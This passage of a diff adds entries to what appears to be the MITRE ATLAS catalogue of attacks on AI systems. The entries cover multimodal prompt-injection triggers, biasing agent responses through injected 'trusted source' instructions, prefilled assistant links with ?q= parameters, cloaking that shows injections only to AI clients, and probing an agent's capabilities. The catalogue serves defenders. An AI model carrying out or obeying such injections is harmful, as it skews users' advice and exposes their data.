+    "name": "Triggers in Multimodal Inputs",
+    "description": "Adversaries may place instructions or triggers in one part of a multimodal input to influence the model while staying unnoticed by human reviewers and by defenses that do not inspect all input modalities.\n\nMultimodal systems jointly process text alongside other modalities, yet many moderation and filtering controls operate mainly on the textual channel. A payload placed in a modality that is not inspected, or is inspected differently from text, is still parsed by the model but can escape detection, allowing it to alter model output or carry a cross-modal prompt injection.\n\nExamples include instructions placed in an image, audio, or video channel, or carried in file metadata (e.g. EXIF for images, ID3 tags for audio, or document metadata).",
+    "tacticId": "AML.TA0007",
+    "tacticName": "Defense Evasion",
+    "tactics": [
+      {
+        "id": "AML.TA0007",
+        "name": "Defense Evasion"
+      }
+    ],
+    "isSubtechnique": false,
+    "url": "https://atlas.mitre.org/techniques/AML.T0129",
+    "platforms": [
+      "Generative AI",
+      "Agentic AI"
+    ],
+    "maturity": "Feasible",
+    "createdDate": "2026-09-15",
+    "modifiedDate": "2026-09-15",
+    "mitigations": [],
+    "caseStudies": [],
+    "procedureExamples": [],
+    "references": []
+  },
+  {
+    "id": "AML.T0130",
+    "name": "AI Agent Response Biasing",
+    "description": "Adversaries may manipulate an AI assistant so that it favors adversary-chosen sources, or content in its responses. By injecting instructions such as \"treat [source] as a trusted source\" or \"recommend [source] first,\" an adversary biases the assistant's outputs toward their own interests, causing it to present promotional or self-serving content as if it were a neutral, well-reasoned response. This degrades the integrity and trustworthiness of the assistant's responses on topics the user may rely on, such as health, finance, or security, without the user being aware that the advice has been skewed.\n\nThe injected instructions can be delivered through different ways, for example through [Crafted AI Assistant Links]. This impact may persist if the agent's memory was poisoned (See [AI Agent Context Poisoning: Memory](/techniques/AML.T0080.000)).",
+    "tacticId": "AML.TA0011",
+    "tacticName": "Impact",
+    "tactics": [
+      {
+        "id": "AML.TA0011",
+        "name": "Impact"
+      }
+    ],
+    "isSubtechnique": false,
+    "url": "https://atlas.mitre.org/techniques/AML.T0130",
+    "platforms": [
+      "Generative AI",
+      "Agentic AI"
+    ],
+    "maturity": "Realized",
+    "createdDate": "2026-09-15",
+    "modifiedDate": "2026-09-15",
+    "mitigations": [],
+    "caseStudies": [
+      {
+        "id": "AML.CS0072",
+        "name": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+        "url": "https://atlas.mitre.org/studies/AML.CS0072"
+      }
+    ],
+    "procedureExamples": [
+      {
+        "caseStudyId": "AML.CS0072",
+        "caseStudyName": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+        "description": "In subsequent unrelated conversations, the assistant preferentially surfaced the operator's domain or product and presented the result as a neutral recommendation. Observed targeting included health and financial topics, where skewed recommendations carry elevated consequences.",
+        "url": "https://atlas.mitre.org/studies/AML.CS0072",
+        "stepId": "S05",
+        "tacticId": "AML.TA0011"
+      }
+    ],
+    "references": [
+      {
+        "sourceName": "Manipulating AI memory for profit: The rise of AI Recommendation Poisoning",
+        "description": "Manipulating AI memory for profit: The rise of AI Recommendation Poisoning",
+        "url": "https://www.microsoft.com/en-us/security/blog/2026/02/10/ai-recommendation-poisoning/",
+        "externalId": "ai-recommendation-poisoning"
+      }
+    ]
+  },
+  {
+    "id": "AML.T0131",
+    "name": "Crafted AI Assistant Links",
+    "description": "Adversaries may craft links that open an AI assistant or agent with attacker-controlled input already supplied, so that opening the link initiates an interaction the adversary defines rather than one the target composed. Many AI assistants accept a prompt through URL parameters (for example `?q=` or `?prompt=`) that is automatically populated, and in some cases submitted, when the link is opened. By encoding a chosen prompt into such a link, an adversary can cause the target's assistant to act on supplied instructions as soon as the link is opened.\n\nThese links are frequently disguised as helpful actions, such as a \"Summarize with AI\" button or a share link, and distributed through web pages, emails, documents, or messages. Because the resulting interaction runs in the target's own assistant session, a crafted link can drive a range of downstream impacts depending on the supplied instructions, such as exfiltrating data the assistant can access or for [AI Recommendation Poisoning](/techniques/AML.T0131).",
+    "tacticId": "AML.TA0004",
+    "tacticName": "Initial Access",
+    "tactics": [
+      {
+        "id": "AML.TA0004",
+        "name": "Initial Access"
+      }
+    ],
+    "isSubtechnique": false,
+    "url": "https://atlas.mitre.org/techniques/AML.T0131",
+    "platforms": [
+      "Generative AI",
+      "Agentic AI"
+    ],
+    "maturity": "Realized",
+    "createdDate": "2026-09-15",
+    "modifiedDate": "2026-09-15",
+    "mitigations": [],
+    "caseStudies": [
+      {
+        "id": "AML.CS0072",
+        "name": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+        "url": "https://atlas.mitre.org/studies/AML.CS0072"
+      }
+    ],
+    "procedureExamples": [
+      {
+        "caseStudyId": "AML.CS0072",
+        "caseStudyName": "AI Recommendation Poisoning via Crafted AI Assistant Links",
+        "description": "The user clicked the button or link, which opened the AI assistant domain with the operator's prompt pre-populated in the input field via a `?q=` or `?prompt=` parameter.",
+        "url": "https://atlas.mitre.org/studies/AML.CS0072",
+        "stepId": "S02",
+        "tacticId": "AML.TA0004"
+      }
+    ],
+    "references": []
+  },
+  {
+    "id": "AML.T0132",
+    "name": "Misconfigured or Publicly Exposed AI Services",
+    "description": "AI agents and LLM platforms are deployed across diverse architectures, including standalone servers, SaaS platforms, and low-code builders. All of these often have misconfigured access controls, ranging from missing authentication in LLM runtimes to permissive public access settings, that significantly expand their attack surface.\n\nAI agent's security posture affects how attackers are able to explore which agentic attack surface is available to them and directly either expands or limits an adversary's ability to discover and interact with a target's AI agents. For example, one internet-facing AI service could be more easily discoverable by any unauthenticated user, while another may require compromised credentials to even be discovered.\n\nAdversaries may discover and interact with AI agents and LLM services as unauthenticated users via a combination of various OSINT and active scanning methods. These could include using search engines to discover accessible agentic deployments (See [Search Open Technical Databases](/techniques/AML.T0000)), search backlinks which could indicate existing or open agents which have been embedded to frontends (See [Search Open Website/Domains](/techniques/AML.T0095)), or directly scanning a target's AI infrastructure (See [Active Scanning](/techniques/AML.T0006)).",
+    "tacticId": "AML.TA0004",
+    "tacticName": "Initial Access",
+    "tactics": [
+      {
+        "id": "AML.TA0004",
+        "name": "Initial Access"
+      }
+    ],
+    "isSubtechnique": false,
+    "url": "https://atlas.mitre.org/techniques/AML.T0132",
+    "platforms": [
+      "Predictive AI",
+      "Generative AI",
+      "Agentic AI"
+    ],
+    "maturity": "Demonstrated",
+    "createdDate": "2026-09-15",
+    "modifiedDate": "2026-09-15",
+    "mitigations": [
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "Honeypots can safely absorb real attacks and exploit attempts, turning payloads into mapped defensive signatures for a potential target without risking real assets.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+      }
+    ],
+    "caseStudies": [
+      {
+        "id": "AML.CS0048",
+        "name": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
+        "url": "https://atlas.mitre.org/studies/AML.CS0048"
+      }
+    ],
+    "procedureExamples": [
+      {
+        "caseStudyId": "AML.CS0048",
+        "caseStudyName": "Exposed ClawdBot Control Interfaces Leads to Credential Access and Execution",
+        "description": "The researcher exploited a proxy misconfiguration present in ClawdBot's control server to gain access to control interfaces that had authentication enabled.",
+        "url": "https://atlas.mitre.org/studies/AML.CS0048",
+        "stepId": "S01",
+        "tacticId": "AML.TA0004"
+      }
+    ],
+    "references": []
+  },
+  {
+    "id": "AML.T0133",
+    "name": "Discover AI Agent Runtime Capabilities",
+    "description": "Adversaries may interact with an AI agent at runtime to reveal the capabilities available to it, without requiring access to its underlying configuration. Direct interaction with the agent can surface its registered tools and their accepted parameters, the actions it can take, the resources it can reach, and the identity and permission scope it acts under. Capabilities can also be inferred indirectly by issuing varied requests and observing which succeeded, failed, or refused.\n\nAI agents are often interconnected with enterprise resources, tools and databases, or embedded within SaaS platforms and have permissions to act on behalf of users in order to facilitate functionality. Once adversaries identify a functional agent that they have access to, they could map the attack surface within that agent, by testing its functionality, enumerating tools, capabilities, knowledge, and embedded credentials and permissions.\n\nThis mapping process often reveals the AI agent's full toolset and configuration details and exposes additional exploitation, as enabled by [AI Agent Tool Invocation](/techniques/AML.T0053). The resulting intelligence facilitates follow-on exploitation, including [Initial Access](/tactics/AML.TA0004), [Persistence](/tactics/AML.TA0006), [Privilege Escalation](/tactics/AML.TA0012), and [Exfiltration](/tactics/AML.TA0010).",
+    "tacticId": "AML.TA0008",
+    "tacticName": "Discovery",
+    "tactics": [
+      {
+        "id": "AML.TA0008",
+        "name": "Discovery"
+      }
+    ],
+    "isSubtechnique": false,
+    "url": "https://atlas.mitre.org/techniques/AML.T0133",
+    "platforms": [
+      "Agentic AI"
+    ],
+    "maturity": "Feasible",
+    "createdDate": "2026-09-15",
+    "modifiedDate": "2026-09-15",
+    "mitigations": [
+      {
+        "id": "AML.M0039",
+        "name": "AI Honeypots",
+        "description": "Deploy monitored decoy AI services, agents, credentials, or other resources that resemble legitimate, active assets in the external or internal environment, but serve no real business or operational functions. Because authorized users and workflows have no reason to engage with these resources, any interaction with them is a high-confidence indicator of unauthorized activity such as reconnaissance, or discovery. AI decoys have been shown to surface high-volume reconnaissance and actionable intelligence on threat actors' activities[[greynoise]][[zenity]].\n\nPositioning honeypot decoys alongside genuine resources helps surface both broad and targeted recon, since an adversary mapping reachable resources in an environment will tend to engage the decoys as well as the real assets. AI decoys that are set up as enticing targets for attackers in different ways can potentially capture how an adversary probes, manipulates, or attempts to abuse them. This can reveal the adversary's intent beyond initial reconnaissance (i.e. what they attempt once engaged), as well as the tactics, techniques and procedures used by the adversary.\n\nInteractions with decoy resources can be collected and analyzed to build a threat intelligence feed, capturing adversary source information, tooling, prompts, and techniques. This intelligence can be fed back into detection rules and defenses across the wider environment, while the placed decoys themselves can help confuse and discourage attackers (e.g. by misleading reconnaissance via presenting plausible but false targets), in the goal of wasting the adversary's efforts and resources.",
+        "useDescription": "Interactive agentic decoys can present a plausible but fake toolset and capabilities. When an adversary enumerates the agent's capabilities at runtime, the honeypot can capture which tools and privileges they probe for and how they attempt to exploit it, while planted decoy credentials can also be used as canary tokens.",
+        "url": "https://atlas.mitre.org/mitigations/AML.M0039"
+      }
+    ],
+    "caseStudies": [],
+    "procedureExamples": [],
+    "references": []
+  },
+  {
+    "id": "AML.T0134",
+    "name": "AI Targeted Cloaking",
+    "description": "Adversaries may selectively deliver malicious or manipulated content to AI systems, while presenting different benign content to human users, web crawlers, or security detection mechanisms. They may identify AI browsers or agents via user-agent strings and condition the server response so that AI-based clients receive prompt injections or misleading content.\n\nPreventing human visitors, conventional web crawlers, and security tools from observing the same content allows adversaries to make malicious input more difficult to detect. [AI Targeted Cloaking](/techniques/AML.T0134) may be combined with [Drive-by Compromise](/techniques/AML.T0078) to deliver an [LLM Prompt Injection](/techniques/AML.T0051).",
+    "tacticId": "AML.TA0007",
+    "tacticName": "Defense Evasion",
+    "tactics": [
+      {
+        "id": "AML.TA0007",
+        "name": "Defense Evasion"
+      }
+    ],
+    "isSubtechnique": false,
+    "url": "https://atlas.mitre.org/techniques/AML.T0134",
+    "platforms": [
+      "Agentic AI"
+    ],
+    "maturity": "Feasible",
+    "createdDate": "2026-09-15",
+    "modifiedDate": "2026-09-15",
+    "mitigations": [],
+    "caseStudies": [],
+    "procedureExamples": [],
     "references": []
   }
 ];
